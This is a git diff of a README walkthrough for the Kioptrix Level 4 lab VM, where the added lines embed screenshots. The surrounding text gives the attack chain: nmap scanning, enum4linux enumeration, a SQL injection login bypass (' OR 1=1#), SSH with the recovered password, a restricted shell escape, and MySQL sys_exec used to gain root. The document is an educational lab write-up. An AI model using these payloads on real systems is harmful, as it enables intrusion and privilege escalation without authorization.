@@ -28,16 +28,23 @@ We will first run the command;
 ---
 - To check what ip is allocated to the attacking machine and also determine the subnet range.
 
+<p align="center"> <img src="https://github.com/itstallam/Kioptrix-Level-4-Walkthrough/blob/main/Screenshots/A.%20IFCONFIG.PNG" alt="Webpage Result" width="600"/> </p>
 
 ### **Host Discovery**
 > $nmap -sn 192.168.56.1/24
 ---
 - We are trying to do a ping sweep to identify live hosts within the subnet.
 
+<p align="center"> <img src="https://github.com/itstallam/Kioptrix-Level-4-Walkthrough/blob/main/Screenshots/B.%20NMAP.PNG" alt="Webpage Result" width="600"/> </p>
+
+
 ### **Port Scan**
 > $nmap -p 0-65000 -A 192.168.56.15
 ---
 - Scans all ports from  0- 65000. **-A** flag is for aggressive mode that bundles multiple flags for OS and service detection.
+
+<p align="center"> <img src="https://github.com/itstallam/Kioptrix-Level-4-Walkthrough/blob/main/Screenshots/C.%20Nmap%20port%20scan..PNG" alt="Webpage Result" width="600"/> </p>
+
 ### Findings
 From our previous scan we can see that:
 - port 22 (ssh), 80 (http), 139 (SMB) and 445 (SMB) are open.
@@ -50,6 +57,10 @@ We have a login page with an authentication form requiring a username and passwo
 ### **SMB Enumeration**
 > $enum4linux 192.168.56.15
 ---
+
+<p align="center"> <img src="https://github.com/itstallam/Kioptrix-Level-4-Walkthrough/blob/main/Screenshots/D.%20Enum4linux..PNG" alt="Webpage Result" width="600"/> </p>
+
+
 - We discover some users
 
 - user:[nobody] rid:[0x1f5]
@@ -78,7 +89,7 @@ Password: ' OR 1=1#
 A successful auth bypass revealing John's password **MyNameIsJohn**
 
 
-See the result on webpage.png
+<p align="center"> <img src="https://github.com/itstallam/Kioptrix-Level-4-Walkthrough/blob/main/Screenshots/E.%20Webpage..PNG" alt="Webpage Result" width="600"/> </p>
 
 ## 4. Gaining Shell Access
 Now since we have gotten the password to john's account. We will try to 'ssh' into his machine.  Since we saw port 22 was open from the previous nmap scan **"nmap -p 0-65000 -A 192.168.56.15"**
@@ -91,7 +102,7 @@ Command:
 - You will be prompted type "yes" and hit "enter"
 - The password is "MyNameIsJohn" from the previous SQLi Attack
 
-See SSH.png
+<p align="center"> <img src="https://github.com/itstallam/Kioptrix-Level-4-Walkthrough/blob/main/Screenshots/F.%20Escal1.PNG" alt="Webpage Result" width="600"/> </p>
 
 #### Restricted Shell Escape
 We have now reached the peak of the hacking process. Let's try and see what commands can john run.
@@ -119,7 +130,7 @@ where :
 - **exec grep -Hn password {} \;** - Search for "password" strings
 
 
-After the output (see FIND.png)
+<p align="center"> <img src="https://github.com/itstallam/Kioptrix-Level-4-Walkthrough/blob/main/Screenshots/F.%20Escal1.PNG" alt="Webpage Result" width="600"/> </p>
 
 - We see that there's a mysql root with a blank password.
 
@@ -136,7 +147,8 @@ Then we try multiple SQL statements to see what more we can find after logging i
 Command 
 >mysql> select * from mysql.func;
 ---
-See output in MYSQL1.png
+
+<p align="center"> <img src="https://github.com/itstallam/Kioptrix-Level-4-Walkthrough/blob/main/Screenshots/G.%20MYSQL1..PNG" alt="Webpage Result" width="600"/> </p>
 
 - We find a very important element "sys_exec" which can be used for system command execution.
 
@@ -146,7 +158,8 @@ We run the command
 ---
 - What this command does is adds (-a) John (usermod) to the admin group (-G)
 
-See output in MYSQL2.png
+<p align="center"> <img src="https://github.com/itstallam/Kioptrix-Level-4-Walkthrough/blob/main/Screenshots/H.%20MYSQL2..PNG" alt="Webpage Result" width="600"/> </p>
+
 
 - Then quit the mysql interface
 command
@@ -177,7 +190,7 @@ command
 > root@Kioptrix4:~# cat congrats.txt
 ---
 
-See CONGRATS.png
+<p align="center"> <img src="https://github.com/itstallam/Kioptrix-Level-4-Walkthrough/blob/main/Screenshots/I.%20CONGRATS..PNG" alt="Webpage Result" width="600"/> </p>
 
 🔒 Security Recommendations
 - Input Validation: Implement proper input sanitization to prevent SQL injection
